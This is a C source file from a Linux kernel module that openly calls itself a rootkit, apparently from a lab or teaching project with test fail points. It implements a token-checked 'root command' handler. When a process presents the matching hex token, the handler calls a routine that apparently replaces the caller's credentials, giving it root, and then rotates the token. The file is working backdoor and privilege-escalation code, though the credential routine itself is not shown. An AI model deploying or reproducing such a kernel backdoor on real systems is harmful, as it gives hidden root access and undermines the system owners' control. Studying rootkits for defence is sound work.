// SPDX-License-Identifier: GPL-2.0
#include <crypto/utils.h>
#include <linux/errno.h>
#include <linux/hex.h>
#include <linux/mutex.h>
#include <linux/random.h>
#include <linux/string.h>

#include "rootkit.h"

static DEFINE_MUTEX(authorization_lock);
static u8 active_token[RK_AUTHORIZATION_TOKEN_BYTES];
static unsigned long completed_actions;
static bool authorization_started;

static bool rk_tokens_equal(const u8 *left, const u8 *right)
{
	return crypto_memneq(left, right, RK_AUTHORIZATION_TOKEN_BYTES) == 0;
}

static void rk_rotate_token(const u8 previous[RK_AUTHORIZATION_TOKEN_BYTES])
{
	do {
		get_random_bytes(active_token, sizeof(active_token));
	} while (rk_tokens_equal(active_token, previous));
}

static int rk_parse_root_command(const char *command, size_t length,
				 u8 token[RK_AUTHORIZATION_TOKEN_BYTES])
{
	const size_t prefix_length = sizeof(RK_ROOT_COMMAND_PREFIX) - 1U;
	const char *encoded;
	size_t index;

	if (length != RK_ROOT_COMMAND_LENGTH ||
	    memcmp(command, RK_ROOT_COMMAND_PREFIX, prefix_length) != 0)
		return -EINVAL;
	encoded = command + prefix_length;
	for (index = 0; index < RK_AUTHORIZATION_TOKEN_HEX_LENGTH; index++) {
		const char byte = encoded[index];

		if (!((byte >= '0' && byte <= '9') ||
		      (byte >= 'a' && byte <= 'f')))
			return -EINVAL;
	}
	return hex2bin(token, encoded, RK_AUTHORIZATION_TOKEN_BYTES);
}

int rk_authorization_start(void)
{
	u8 empty[RK_AUTHORIZATION_TOKEN_BYTES] = { 0 };
	int error;

	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_AUTHORIZATION_START)
		return -EINTR;
	error = wait_for_random_bytes();
	if (error)
		return error;

	mutex_lock(&authorization_lock);
	memzero_explicit(active_token, sizeof(active_token));
	completed_actions = 0;
	rk_rotate_token(empty);
	authorization_started = true;
	mutex_unlock(&authorization_lock);
	memzero_explicit(empty, sizeof(empty));
	return 0;
}

void rk_authorization_stop(void)
{
	mutex_lock(&authorization_lock);
	memzero_explicit(active_token, sizeof(active_token));
	completed_actions = 0;
	authorization_started = false;
	mutex_unlock(&authorization_lock);
}

void rk_authorization_snapshot(const struct rk_state *state,
			       bool *actions_enabled,
			       unsigned long *completed,
			       char token[RK_AUTHORIZATION_TOKEN_TEXT_CAPACITY])
{
	mutex_lock(&authorization_lock);
	*actions_enabled = rk_state_actions_enabled(state);
	*completed = completed_actions;
	bin2hex(token, active_token, sizeof(active_token));
	token[RK_AUTHORIZATION_TOKEN_HEX_LENGTH] = '\0';
	mutex_unlock(&authorization_lock);
}

int rk_authorization_execute(struct rk_state *state, const char *command,
			     size_t length)
{
	u8 presented[RK_AUTHORIZATION_TOKEN_BYTES];
	u8 consumed[RK_AUTHORIZATION_TOKEN_BYTES];
	int error;

	error = rk_parse_root_command(command, length, presented);
	if (error)
		goto clear_presented;

	mutex_lock(&authorization_lock);
	if (!authorization_started || !rk_state_actions_enabled(state) ||
	    !rk_tokens_equal(presented, active_token)) {
		error = -EACCES;
		goto unlock;
	}

	memcpy(consumed, active_token, sizeof(consumed));
	memzero_explicit(active_token, sizeof(active_token));
	error = rk_credentials_replace_current();
	rk_rotate_token(consumed);
	if (!error) {
		completed_actions++;
	}
	memzero_explicit(consumed, sizeof(consumed));

unlock:
	mutex_unlock(&authorization_lock);
clear_presented:
	memzero_explicit(presented, sizeof(presented));
	return error;
}
